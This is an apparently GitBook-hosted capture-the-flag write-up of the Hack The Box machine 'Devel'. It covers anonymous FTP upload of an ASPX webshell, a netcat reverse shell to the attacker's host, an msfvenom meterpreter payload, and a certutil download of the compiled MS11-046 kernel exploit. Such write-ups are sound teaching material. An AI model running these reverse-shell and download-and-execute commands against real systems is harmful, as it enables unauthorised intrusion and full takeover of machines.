---
description: Work In Progress...
---

# Devel

## Overview

## Enumeration

As always we start with an Nmap scan. This is the one I ran

```bash
 sudo nmap -sV -sC 10.129.203.118 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 16:45 EDT
Nmap scan report for 10.129.203.118
Host is up (0.034s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
```

The scan reveals we have two services open: `Microsoft FTP` on `port 21` and `Microsoft IIS` web server on `port 80`.

### FTP

What's particularly interesting is that anonymous login is allowed on port 21 so let's explore that.

We'll make sure that anonymous login does work, which indeed it does.

![](<../../../../.gitbook/assets/image (11) (2).png>)

However, there isn't anything useful for us here.

### IIS

We see what looks to be the default landing page for IIS

![](<../../../../.gitbook/assets/image (40) (1).png>)

Running a dirsearch on the website also did not prove to be useful.

### Curl

I ran a curl command with `-I` to get only the document info

```bash
curl -I http://10.129.203.118/
HTTP/1.1 200 OK
Content-Length: 689
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Wed, 23 Mar 2022 21:06:06 GMT
```

Seeing that the server is running ASP.NET and I have access to FTP, I can probably upload a webshell

## Foothold w/o Metasploit

### Webshell

I decided to go with the webshell from SecLists

![](<../../../../.gitbook/assets/image (7) (2).png>)

Now we'll upload it over ftp:

![](<../../../../.gitbook/assets/image (46).png>)

We can access our webshell by visiting `10.129.203.118/cmd.aspx`

![](<../../../../.gitbook/assets/image (25) (1).png>)

Here's what returns when entering `whoami`

![](<../../../../.gitbook/assets/image (50).png>)

### Reverse shell

I'll be getting a shell with `nc.exe`

I use impacket-smbserver to host a windows netcat executable to then execute a connection to my kali machine

![](<../../../../.gitbook/assets/image (2) (1) (2).png>)

I also start a nc listener on my kali machine to catch a shell

![](<../../../../.gitbook/assets/image (2) (1) (1).png>)

Entering the following command into the webshell:

```
\\10.10.14.3\share\nc.exe -e cmd.exe 10.10.14.3 443
```

![](<../../../../.gitbook/assets/image (3) (1).png>)

And I get a shell!

![](<../../../../.gitbook/assets/image (1) (1) (1).png>)

## Foothold w/ Metasploit

I'll create the payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=443 -f aspx > meterpreter_rev_443.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2873 bytes
```

Put it on the FTP server

```
ftp> put meterpreter_rev_443.aspx
local: meterpreter_rev_443.aspx remote: meterpreter_rev_443.aspx
229 Entering Extended Passive Mode (|||49186|)
125 Data connection already open; Transfer starting.
100% |**************************************|  2910       34.68 MiB/s    --:-- ETA
226 Transfer complete.
2910 bytes sent in 00:00 (100.65 KiB/s)
```

Use the Metasploit module `exploit/multi/handler`

![](<../../../../.gitbook/assets/image (16) (2).png>)

Visit the page&#x20;

```
http://10.129.203.118/meterpreter_rev_443.aspx
```

And catch a shell!

![](<../../../../.gitbook/assets/image (72).png>)

## Privilege Escalation

Running systeminfo in the shell shows us some good information

![](<../../../../.gitbook/assets/image (44).png>)

In particular, I'm interested in the OS Version, so I look up priv esc for this build and find a nice exploit to use.

{% embed url="https://www.exploit-db.com/exploits/40564" %}

Per the description:

> **Vulnerability description:**
>
> The Ancillary Function Driver (AFD) supports Windows sockets applications and is contained in the afd.sys file.&#x20;
>
> The afd.sys driver runs in kernel mode and manages the Winsock TCP/IP communications protocol.&#x20;
>
> An elevation of privilege vulnerability exists where the AFD improperly validates input passed from user mode to the kernel.&#x20;
>
> An attacker must have valid logon credentials and be able to log on locally to exploit the vulnerability.&#x20;
>
> An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM privileges)

We'll compile the code as suggested by the exploit

![](<../../../../.gitbook/assets/image (52).png>)

```
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
```

Since we don't have full access to any user, we'll create a temp directory inside the Public folder and use something like certutil to upload the exploit and use a python http server to aid in the transfer

```
certutil -urlcache -f http://10.10.14.13/MS11-046.exe MS11-046.exe
```

![](<../../../../.gitbook/assets/image (8) (1) (2).png>)

![](<../../../../.gitbook/assets/image (70).png>)

Now we will run the exploit which should give us NT Auth\System level privileges

![](<../../../../.gitbook/assets/image (45).png>)

With our exploit executing successfully, we'll grab both the user and root flags!

![](<../../../../.gitbook/assets/image (56).png>)

![](<../../../../.gitbook/assets/image (23) (1).png>)
